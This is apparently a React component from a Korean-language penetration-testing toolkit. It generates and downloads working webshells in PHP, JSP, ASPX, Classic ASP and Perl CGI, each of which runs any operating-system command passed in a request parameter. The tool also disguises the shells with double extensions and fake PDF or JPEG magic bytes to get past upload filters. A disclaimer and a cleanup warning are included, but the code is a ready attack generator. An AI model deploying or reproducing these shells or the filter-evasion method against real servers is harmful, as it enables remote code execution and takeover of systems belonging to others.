import { useState } from 'react'
import { Download } from 'lucide-react'
import { DISCLAIMER, Note, Pick, Readout, TextInput } from './shared'

const FILE_INFO: Record<string, { ext: string; mime: string }> = {
  PHP: { ext: 'php', mime: 'application/x-httpd-php' },
  JSP: { ext: 'jsp', mime: 'text/x-jsp' },
  ASPX: { ext: 'aspx', mime: 'application/x-aspx' },
  ASP: { ext: 'asp', mime: 'text/asp' },
  Perl: { ext: 'pl', mime: 'application/x-perl' },
}

/** 업로드 필터(확장자/매직바이트) 우회 테스트용 위장 포맷. 컨테이너 자체가 코드를 실행하는 것이
 * 아니라, 이중 확장자·매직바이트 검사만 하는 서버 설정을 테스트하기 위한 것이다. */
const DISGUISE_TARGETS: { id: string; label: string; ext: string; mime: string; magic?: string }[] = [
  { id: 'html', label: 'HTML 위장', ext: 'html', mime: 'text/html' },
  { id: 'pdf', label: 'PDF 위장', ext: 'pdf', mime: 'application/pdf', magic: '%PDF-1.4\n' },
  { id: 'docx', label: 'Word(DOCX) 위장', ext: 'docx', mime: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document' },
  { id: 'txt', label: 'TXT 위장', ext: 'txt', mime: 'text/plain' },
  { id: 'md', label: 'Markdown 위장', ext: 'md', mime: 'text/markdown' },
  { id: 'jpg', label: 'JPG 위장 (JPEG 매직바이트)', ext: 'jpg', mime: 'image/jpeg', magic: 'ÿØÿà\n' },
  { id: 'jpeg', label: 'JPEG 위장 (JPEG 매직바이트)', ext: 'jpeg', mime: 'image/jpeg', magic: 'ÿØÿà\n' },
  { id: 'mkv', label: 'MKV 위장', ext: 'mkv', mime: 'video/x-matroska' },
  { id: 'mp4', label: 'MP4 위장', ext: 'mp4', mime: 'video/mp4' },
]

export function WebshellPayloadBuilder() {
  const [lang, setLang] = useState<'PHP' | 'JSP' | 'ASPX' | 'ASP' | 'Perl'>('PHP')
  const [param, setParam] = useState('cmd')

  const getCode = (lang: string, p: string) => {
    switch (lang) {
      case 'PHP':
        return `<?php if(isset(\$_REQUEST['${p}'])){ echo "=== SECURITY TEST (Security_Test.php) — Authorized diagnostic execution ===\\n"; echo "Executed at: ".date('c')."\\n"; system(\$_REQUEST['${p}']); } ?>`
      case 'JSP':
        return `<% if(request.getParameter("${p}")!=null){ out.println("=== SECURITY TEST (Security_Test.jsp) — Authorized diagnostic execution ==="); out.println("Executed at: " + new java.util.Date()); Runtime.getRuntime().exec(request.getParameter("${p}")); } %>`
      case 'ASPX':
        return `<%@ Page Language="C#" %><% if(Request["${p}"]!=null){ Response.Write("=== SECURITY TEST (Security_Test.aspx) — Authorized diagnostic execution ===\\n"); Response.Write("Executed at: " + DateTime.Now + "\\n"); System.Diagnostics.Process.Start("cmd.exe","/c "+Request["${p}"]); } %>`
      case 'ASP':
        return `<% Response.Write("=== SECURITY TEST (Security_Test.asp) — Authorized diagnostic execution ===" & vbCrLf) : Response.Write("Executed at: " & Now() & vbCrLf) : Set o = Server.CreateObject("WScript.Shell") : Response.Write(o.Exec(Request("${p}")).StdOut.ReadAll()) %>`
      case 'Perl':
        return `#!/usr/bin/perl\nuse CGI;\nmy $q = CGI->new;\nprint $q->header('text/plain');\nprint "=== SECURITY TEST (Security_Test.pl) — Authorized diagnostic execution ===\\n";\nprint "Executed at: " . localtime() . "\\n";\nmy $c = $q->param('${p}');\nprint \`$c\`;`
      default:
        return ''
    }
  }

  const { ext, mime } = FILE_INFO[lang]
  const code = getCode(lang, param)

  return (
    <div className="payload-builder">
      <Note>{DISCLAIMER}</Note>
      <div className="webshell-cleanup-warning">
        ⚠️ 경고: 테스트 종료 후 업로드한 웹쉘 파일은 반드시 삭제하고 보고서에 기록하십시오. 서버에 방치된 웹쉘은 치명적인 2차 피해를 유발할 수 있습니다.
      </div>

      <Pick label="언어 선택" value={lang} onChange={setLang} options={[
        { id: 'PHP', label: 'PHP' },
        { id: 'JSP', label: 'JSP' },
        { id: 'ASPX', label: 'ASPX' },
        { id: 'ASP', label: 'ASP (Classic)' },
        { id: 'Perl', label: 'Perl (CGI)' },
      ]} />
      <TextInput label="명령 실행 파라미터 이름" value={param} onChange={setParam} placeholder="cmd" />

      <div className="payload-readout-group">
        <strong className="payload-group-title">웹쉘 소스코드</strong>
        <Readout title={`${lang} Webshell`} value={code} wrap="pre" />
        <button className="secondary-button csrf-action-btn" onClick={() => {
          const blob = new Blob([code], { type: mime })
          const url = URL.createObjectURL(blob)
          const a = document.createElement('a')
          a.href = url; a.download = `Security_Test.${ext}`
          a.click()
          URL.revokeObjectURL(url)
        }}><Download size={14}/>다운로드 (Security_Test.{ext})</button>
      </div>

      <div className="payload-readout-group">
        <strong className="payload-group-title">업로드 필터 우회용 위장 포맷</strong>
        <Note>이중 확장자/매직바이트 검사만 하는 업로드 필터를 테스트하기 위한 것입니다. 컨테이너 포맷 자체가 코드를 실행하지는 않으며, 실제 실행 여부는 서버가 이중 확장자(.{ext}.jpg 등)를 신뢰하는지, 확장자 기반 핸들러(AddHandler)가 걸려 있는지, 또는 LFI와 결합되는지에 달려 있습니다.</Note>
        {DISGUISE_TARGETS.map(target => (
          <button
            key={target.id}
            className="secondary-button csrf-action-btn"
            onClick={() => {
              const content = (target.magic ?? '') + code
              const blob = new Blob([content], { type: target.mime })
              const url = URL.createObjectURL(blob)
              const a = document.createElement('a')
              a.href = url; a.download = `Security_Test.${ext}.${target.ext}`
              a.click()
              URL.revokeObjectURL(url)
            }}
          ><Download size={14}/>{target.label} (Security_Test.{ext}.{target.ext})</button>
        ))}
      </div>
    </div>
  )
}

export default WebshellPayloadBuilder
